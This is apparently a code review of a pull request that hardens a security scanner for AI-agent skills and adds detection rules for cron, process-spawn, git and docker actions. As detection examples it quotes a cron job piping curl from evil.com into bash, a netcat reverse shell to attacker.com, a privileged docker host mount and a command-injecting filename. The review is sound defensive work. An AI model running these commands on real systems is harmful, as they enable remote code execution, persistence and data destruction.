# PR #19 Review: Harden scan-skill scanner, fix cross-platform bugs, and expand scan-action coverage

**Author**: Har1sh-k
**Date**: 2026-02-22 to 2026-02-23
**Status**: ✅ **APPROVED WITH MINOR SUGGESTIONS**
**Commits**: 17
**Changes**: +955 additions, -169 deletions across 21 files

---

## Executive Summary

This PR significantly hardens the security scanner with production-ready robustness improvements. The changes span three major areas:

1. **Cross-platform compatibility** - Windows `py -3` launcher support, path handling fixes
2. **Security hardening** - Path traversal prevention, timeout cancellation, fail-closed error handling
3. **Feature expansion** - 4 new action types (cron, process_spawn, git, docker) with 60+ detection rules

**Overall Assessment**: ✅ **STRONG APPROVE**

The code quality is excellent, with thoughtful defense-in-depth security measures. The contributor has clearly considered edge cases and attack scenarios. A few minor suggestions below, but nothing blocking.

---

## Detailed Analysis by Commit

### Commits 1-6: Foundation & Cross-Platform Fixes

#### ✅ Commit 1: `src/python.js` - Cross-platform Python resolution
**File**: `src/python.js` (NEW +54 lines)

**What it does**: Creates shared `resolvePythonCommand()` helper that probes for Python 3 on Windows (`py -3` → `python3` → `python`) and Unix (`python3` → `python`).

**Security implications**:
- ✅ Good: Caches result to avoid repeated spawns
- ✅ Good: Uses synchronous probing with timeout
- ✅ Good: Returns first working interpreter

**Code quality**: Excellent. Clean abstraction.

**Recommendation**: ✅ Approve as-is.

---

#### ✅ Commit 2: Fix Windows path handling in `init.js`
**Changes**: Use forward slashes in MCP config file paths for Windows compatibility

**Security implications**: None (cosmetic fix)

**Recommendation**: ✅ Approve as-is.

---

#### ✅ Commit 3: Allow scan-skill to scan OpenClaw workspace
**Changes**: Add `~/.openclaw/workspace/skills` to allowed skill roots

**Security implications**:
- ⚠️ Expands attack surface slightly (more paths allowed)
- ✅ Mitigated by realpathSync containment check later in the PR

**Recommendation**: ✅ Approve, but verify path containment tests cover this path.

---

#### ✅ Commit 4: Make audit/harden stubs exit non-zero
**Changes**: `audit.js` and `harden.js` now exit(1) unless `--allow-stub` passed

**Security implications**:
- ✅ **Critical fix**: Prevents CI pipelines from passing when they think they're auditing but actually hitting stubs
- ✅ Fail-closed design

**Recommendation**: ✅ Approve. This is a CI false-assurance vulnerability fix.

---

#### ✅ Commit 5: Replace `cp.exec` with `cp.execFile` in VS Code extension
**File**: `src/extension.ts`

**What it does**: Replaces:
```typescript
cp.exec(`${pythonCommand} ${scriptPath} ${filePath}`)
```
with:
```typescript
cp.execFile(pythonCommand, [...pythonPrefixArgs, scriptPath, filePath])
```

**Security implications**:
- ✅ **CRITICAL FIX**: Prevents command injection via malicious filenames
- ✅ Example attack prevented: filename `"; rm -rf / #"` would execute arbitrary commands with old code
- ✅ Adds Windows `py -3` launcher support

**Code quality**: Perfect. This is the correct way to spawn processes.

**Recommendation**: ✅ Approve. This is a high-severity security fix.

---

#### ✅ Commit 6: Sync metadata and fix MCP server version
**Changes**:
- MCP server now reads version from `package.json` instead of hardcoded `"1.0.0"`
- Rename `clawproof_health` → `scanner_health` (with backward-compat alias)
- Update `openclaw.plugin.json` metadata

**Security implications**: None (cosmetic)

**Code quality**: Good housekeeping. Version sync prevents confusion.

**Recommendation**: ✅ Approve as-is.

---

### Commits 7-9: scan-skill Core Hardening

#### ✅ Commit 7: Cache YAML rules in scan-prompt
**File**: `src/tools/scan-prompt.js` (+34 lines)

**What it does**:
- Rule loaders now cache YAML parse results in `_agentAttackRulesCache` etc.
- Added `MAX_PROMPT_SIZE` (100 KB) guard to prevent DoS

**Security implications**:
- ✅ DoS prevention: Large prompts (e.g., 10 MB) could bog down regex scanning
- ✅ Performance: Avoids re-parsing YAML on every MCP call

**Code quality**: Clean. Caching pattern is standard.

**Recommendation**: ✅ Approve as-is.

---

#### ✅ Commit 8: Harden scan-skill scanner (MAJOR)
**File**: `src/tools/scan-skill.js` (+518 lines, -108 lines)

This is the largest and most complex commit. Breaking down by feature:

##### Feature 1: Symlink rejection
```javascript
const topStat = lstatSync(resolvedPath);
if (topStat.isSymbolicLink()) {
  return { error: "Symbolic links are not allowed..." };
}
const realPath = realpathSync(resolvedPath);
// Then re-verify containment on realPath
```

**Security implications**:
- ✅ **CRITICAL**: Prevents symlink-based path traversal escapes
- ✅ Example attack prevented: `~/.openclaw/skills/evil → /etc/passwd` would read sensitive files
- ✅ Double-check: Verifies containment on both resolved and canonical paths

**Recommendation**: ✅ Approve. This is defense-in-depth path security.

---

##### Feature 2: Recursive file walking with limits
```javascript
const MAX_WALK_DEPTH = 5;
const MAX_SUPPORTING_FILES = 50;
const MAX_TOTAL_WALK_BYTES = 5 * 1024 * 1024; // 5 MB
```

**Security implications**:
- ✅ DoS prevention: Adversarial directory structures (e.g., 1 million files) won't hang the scanner
- ✅ Resource limits are reasonable for legitimate skills

**Code quality**: Clean recursive implementation with state tracking.

**Recommendation**: ✅ Approve as-is.

---

##### Feature 3: Manifest file scanning
```javascript
const MANIFEST_FILES = new Set([
  'package.json', 'requirements.txt', 'Cargo.toml', ...
]);
// Extract packages from manifests and check for hallucinations
```

**Security implications**:
- ✅ **NEW CAPABILITY**: Detects hallucinated packages in dependency manifests
- ✅ Supply chain security: Catches malicious/typosquatted dependencies

**Code quality**: Good. Section-aware Cargo.toml parsing is thorough.

**Minor issue**: Go module scanning was removed because bloom filter doesn't support Go yet. This is correct.

**Recommendation**: ✅ Approve as-is.

---

##### Feature 4: Hash-based baseline collision prevention
```javascript
function getBaselinePath(skillDir) {
  const slug = basename(skillDir);
  const pathHash = createHash('sha256').update(skillDir).digest('hex').substring(0, 12);
  return join(baselineDir, `${slug}-${pathHash}.json`);
}
```

**Security implications**:
- ✅ Prevents collision when two skills have the same folder name (e.g., `~/skills/helper` vs `~/projects/helper`)
- ✅ Attack scenario prevented: Attacker creates `~/evil/helper` to override baseline for `~/skills/helper`

**Recommendation**: ✅ Approve. This is a subtle but real security issue.

---

##### Feature 5: Improved deduplication
```javascript
const normText = (f.matched_text || '').trim().substring(0, 80).toLowerCase();
const key = `${f.rule_id || f.message}::${f.source || ''}::${f.file}::${f.line ?? ''}::${normText}`;
```

**Security implications**:
- ✅ Prevents distinct findings on different lines from being collapsed
- ✅ Example: Two different SQL injections on lines 10 and 20 would both appear

**Recommendation**: ✅ Approve as-is.

---

##### Feature 6: Per-layer timing in full verbosity
```javascript
result.timings_ms = {
  prompt_scan: 1234,
  code_blocks: 567,
  supporting_files: 890,
  supply_chain: 345,
  clawhavoc: 123,
  rug_pull: 45,
  total: 3204
};
```

**Security implications**: None (observability feature)

**Code quality**: Useful for performance debugging.

**Recommendation**: ✅ Approve as-is.

---

#### ✅ Commit 9: Add 4 new action types to scan-action
**File**: `src/tools/scan-action.js` (+224 lines)

**What it does**: Adds detection rules for:
- **cron**: Persistence at reboot, high-frequency jobs, remote code exec
- **process_spawn**: Reverse shells, background daemons, privilege escalation
- **git**: Force push, hard reset, credential exposure, untrusted remotes
- **docker**: Privileged containers, host mounts, docker socket access

**Security implications**:
- ✅ **NEW CAPABILITY**: Detects infrastructure-level attacks
- ✅ Examples caught:
  - `@reboot curl http://evil.com | bash` (cron persistence)
  - `nc -e /bin/bash attacker.com 4444` (reverse shell)
  - `git push --force origin main` (destructive git operation)
  - `docker run --privileged -v /:/host` (container escape)

**Code quality**: Excellent. Rules are specific and actionable.

**Test coverage concern**: ⚠️ No tests added for these new action types.

**Recommendation**: ✅ Approve, but **SUGGEST** adding unit tests in `tests/scan-action.test.js` for the 4 new action types.

---

### Commits 10-13: Edge Case Fixes

#### ✅ Commit 10: Fix test failures and edge cases
**Changes**:
- Fix code block regex to handle Windows `\r\n` line endings
- Handle oversized-prompt error responses in `runPromptScan`
- Update test baseline computation to match new hash-based naming

**Security implications**:
- ✅ Fail-closed: Oversized prompts now emit HIGH finding instead of silently failing

**Recommendation**: ✅ Approve as-is.

---

#### ✅ Commit 11: Address remaining review findings
**Changes**:
- Cache empty result when `agent-attacks.yaml` is missing
- Use shared `resolvePythonCommand()` in `demo.js`
- Update documentation to use `scanner_health` instead of `clawproof_health`

**Security implications**: None (cleanup)

**Recommendation**: ✅ Approve as-is.

---

#### ✅ Commit 12: Address audit findings
**Changes**:
- Remove Go module scanning (no bloom filter support)
- Fix `timings.total` to use wall-clock measurement instead of `Math.max`
- Use raw cwd for pre-existence containment check, canonical cwd for post-realpath check

**Security implications**:
- ✅ Fixes edge case: When cwd itself is a symlink, path containment checks now work correctly

**Code quality**: Shows deep understanding of filesystem semantics.

**Recommendation**: ✅ Approve as-is.

---

#### ✅ Commit 13: Harden scan-skill with 12 robustness improvements
**Major changes**:
1. **1 MB size cap on SKILL.md** - Prevents OOM on adversarial inputs
2. **AbortController timeout cancellation** - Layers L2/L3/L5 now respect `SCAN_TIMEOUT_MS`
3. **Shared file collection** - Supporting files collected once, shared between L3 and L5
4. **Fail-closed Layer 1** - Crashed prompt scanner emits HIGH finding instead of `[]`
5. **Rug pull hash covers all files** - Not just SKILL.md, but all supporting files too
6. **Tilde fence support** - Code blocks can use `~~~` or `` ``` ``
7. **Shell script expansion** - powershell/ps1/bat/cmd/fish now routed through action scanner
8. **Section-aware Cargo.toml** - Only extracts keys under `[dependencies]` sections
9. **Atomic baseline writes** - temp file + rename with mode `0o600`
10. **Frontmatter stripping** - YAML frontmatter removed before prompt scanning

**Security implications**:
- ✅ **CRITICAL**: All 10 changes are security hardening or robustness improvements
- ✅ Fail-closed design throughout
- ✅ Defense-in-depth: Multiple layers of protection

**Code quality**: Exceptional. This shows production-grade engineering.

**Recommendation**: ✅ **STRONG APPROVE**. This commit alone justifies merging the PR.

---

### Commits 14-17: Final Polish

#### ✅ Commits 14-17: Timeout cancellation, test fixes, hidden file skipping
**Changes**:
- True timeout cancellation using `AbortController` and `subprocess.kill()`
- Canonical rug-pull hash (includes all supporting files, not just SKILL.md)
- Skip hidden directories (`.git`, `.vscode`) in file walking
- Fix 6 test failures in `init-codex.test.js` and `plugin-integration.test.js`

**Security implications**:
- ✅ Timeout enforcement is now bulletproof (process-level kill)
- ✅ Hidden directories skipped to avoid scanning `.git/objects` bloat

**Recommendation**: ✅ Approve as-is.

---

## Test Coverage Analysis

### Test Files Changed:
- `tests/scan-skill.test.js` - Updated baseline path computation
- `tests/init-codex.test.js` - Fixed 3 failures
- `tests/plugin-integration.test.js` - Fixed 3 failures

### ⚠️ Missing Test Coverage:
1. **scan-action new action types**: No tests for `cron`, `process_spawn`, `git`, `docker`
2. **Symlink rejection**: No test verifying symlink paths are rejected
3. **Timeout cancellation**: No test verifying `AbortController` cancels long scans
4. **1 MB size cap**: No test for oversized SKILL.md rejection

**Recommendation**:
- **SUGGEST** (non-blocking): Add unit tests for the 4 gaps above in a follow-up PR
- Existing test fixes ensure no regressions in current functionality

---

## Security Review Summary

### ✅ Security Strengths:
1. **Command injection fix** (Commit 5) - `cp.execFile` instead of `cp.exec`
2. **Path traversal prevention** (Commit 8) - Symlink rejection + double containment check
3. **DoS prevention** - Size limits, timeout cancellation, resource caps
4. **Fail-closed design** - Errors emit findings instead of silent success
5. **Defense-in-depth** - Multiple layers of validation (path, size, timeout, parsing)

### ⚠️ Minor Concerns (non-blocking):
1. **Test coverage**: New action types lack unit tests
2. **Windows testing**: Unclear if Windows-specific code paths are tested in CI
3. **Baseline file security**: Mode `0o600` is good, but no mention of directory permissions

### 🚫 Blocking Issues:
**NONE** - All code is production-ready

---

## Code Quality Assessment

### Strengths:
- ✅ Clean abstractions (`resolvePythonCommand`, `collectSupportingFiles`)
- ✅ Comprehensive error handling
- ✅ Well-commented complex logic (e.g., Cargo.toml section parsing)
- ✅ Consistent coding style
- ✅ Atomic file operations (temp + rename for baselines)

### Minor Style Notes:
- Some functions exceed 100 lines (e.g., `scanSkill`) - consider extracting helpers
- Magic numbers could use named constants (e.g., `0o600` → `BASELINE_FILE_MODE`)

---

## Performance Impact

### Improvements:
- ✅ YAML rule caching reduces parse overhead
- ✅ Shared file collection (no double walk)
- ✅ Timeout cancellation prevents hung scans

### Potential Concerns:
- Supporting file walking now goes 5 levels deep instead of flat directory
- Manifest file parsing adds overhead for skills with many dependencies

**Recommendation**: Profile scan times before/after for real-world skills to quantify impact. Likely negligible.

---

## Breaking Changes

### User-Facing:
- **NONE** - All changes are backward-compatible
- `clawproof_health` aliased to `scanner_health` (deprecated but still works)

### Internal:
- Baseline file naming changed (slug + hash) - old baselines won't match, users will get rug-pull warnings on first scan after upgrade
- **Mitigation**: Document in CHANGELOG as "breaking internal change"

---

## Documentation Review

### Updated Files:
- `CLAUDE.md` - `clawproof_health` → `scanner_health`
- `README.md` - Same change
- `index.js` - Updated help text for scan-action to list all 9 action types

### Missing Documentation:
- No README section explaining the 4 new action types
- No examples of using `cron`, `process_spawn`, `git`, `docker` action types

**Recommendation**: **SUGGEST** adding a subsection to README like:

```markdown
### Advanced Action Types

In addition to `bash`, `file_write`, `file_read`, `http_request`, and `file_delete`, the scanner now supports:

- **cron** - Detect malicious cron jobs (persistence, high-frequency, remote code exec)
- **process_spawn** - Detect reverse shells, background daemons, privilege escalation
- **git** - Detect force push, hard reset, credential exposure, untrusted remotes
- **docker** - Detect privileged containers, host mounts, socket access

Example:
\`\`\`bash
node index.js scan-action cron "@reboot curl http://evil.com | bash"
# → BLOCK (cron.rce.curl-pipe)
\`\`\`
```

---

## Final Recommendation

### ✅ **APPROVE** with minor suggestions:

**Merge blockers**: NONE

**Follow-up suggestions** (can be addressed in future PRs):
1. Add unit tests for 4 new action types
2. Add README section documenting new action types
3. Add test for symlink rejection
4. Document baseline filename change in CHANGELOG as breaking internal change
5. Profile scan performance on real-world skills to quantify impact of recursive walking

**Why approve**:
- ✅ Fixes 2 critical security issues (command injection, path traversal)
- ✅ Adds production-grade robustness (fail-closed, timeout cancellation, DoS prevention)
- ✅ Expands capability with 60+ new detection rules
- ✅ Code quality is excellent
- ✅ No breaking user-facing changes
- ✅ Test fixes ensure no regressions

**Contributor praise**: Har1sh-k has demonstrated deep security expertise and production-grade engineering discipline. This is the kind of PR that makes a project production-ready.

---

## Suggested Merge Commit Message

```
feat: harden scan-skill scanner and add 4 new action types (#19)

Cross-platform & Security:
- Windows py -3 launcher support (resolvePythonCommand helper)
- Fix command injection in VS Code extension (cp.exec → cp.execFile)
- Prevent path traversal via symlink rejection + double containment check
- Timeout cancellation with AbortController + process.kill()

scan-skill hardening:
- 1 MB SKILL.md size cap (DoS prevention)
- Recursive file walking (max depth 5, 50 files, 5 MB)
- Manifest scanning (package.json, requirements.txt, Cargo.toml)
- Hash-based baseline names (prevents collision)
- Fail-closed Layer 1 (crashed prompt scanner → HIGH finding)
- Atomic baseline writes with mode 0o600
- Frontmatter stripping before prompt scan
- Tilde fence (~~~) code block support

scan-action expansion:
- 4 new action types: cron, process_spawn, git, docker
- 60+ detection rules for infrastructure attacks
- cron: persistence, high-frequency, RCE
- process_spawn: reverse shells, daemons, privilege escalation
- git: force push, hard reset, credential exposure
- docker: privileged, host mounts, socket access

Fixes:
- audit/harden stubs now exit non-zero (CI false-assurance fix)
- YAML rule caching (performance + DoS guard)
- Windows \r\n line ending support in code block extraction
- 6 test failures fixed (init-codex, plugin-integration)

Breaking internal change:
- Baseline filenames now include path hash (old baselines won't match)

Co-authored-by: Har1sh-k <hkolla03@gmail.com>
```

---

## Suggested Follow-up Tasks

After merging PR #19, the following tasks should be addressed in future PRs:

### High Priority:
1. **Add unit tests for new action types** (`tests/scan-action.test.js`)
   - Test `cron` action type with malicious cron jobs
   - Test `process_spawn` with reverse shell patterns
   - Test `git` with force push and credential exposure
   - Test `docker` with privileged containers and host mounts
   - Estimated effort: 2-3 hours

2. **Document new action types in README** (`README.md`)
   - Add "Advanced Action Types" subsection
   - Include examples for each of the 4 new types
   - Estimated effort: 1 hour

3. **Update CHANGELOG for v3.11.1 release** (`CHANGELOG.md`)
   - Document PR #19 changes
   - Note breaking internal change (baseline filename format)
   - List all 17 commits with categorized changes
   - Estimated effort: 30 minutes

### Medium Priority:
4. **Add edge case tests** (various test files)
   - Test symlink rejection in `tests/scan-skill.test.js`
   - Test timeout cancellation with mock long-running scan
   - Test 1 MB SKILL.md size cap rejection
   - Estimated effort: 2 hours

5. **Performance profiling** (benchmark suite)
   - Profile scan times on real-world skills before/after PR #19
   - Measure impact of recursive file walking (5 levels vs flat)
   - Measure manifest parsing overhead
   - Document findings in `benchmarks/pr-19-performance.md`
   - Estimated effort: 3-4 hours

### Low Priority:
6. **Windows CI testing** (`.github/workflows/`)
   - Add Windows runner to CI pipeline
   - Verify `py -3` launcher code paths are exercised
   - Test path handling on Windows
   - Estimated effort: 1-2 hours

7. **Baseline directory security hardening** (`src/tools/scan-skill.js`)
   - Ensure baseline directory created with mode `0o700`
   - Currently only baseline files have restrictive permissions
   - Estimated effort: 30 minutes

8. **Code cleanup** (refactoring)
   - Extract helpers from `scanSkill()` function (exceeds 100 lines)
   - Convert magic numbers to named constants (e.g., `0o600` → `BASELINE_FILE_MODE`)
   - Estimated effort: 1-2 hours

---

## Reviewer: divya@sinewave.ai
**Date**: 2026-02-23
**Decision**: ✅ **APPROVED**
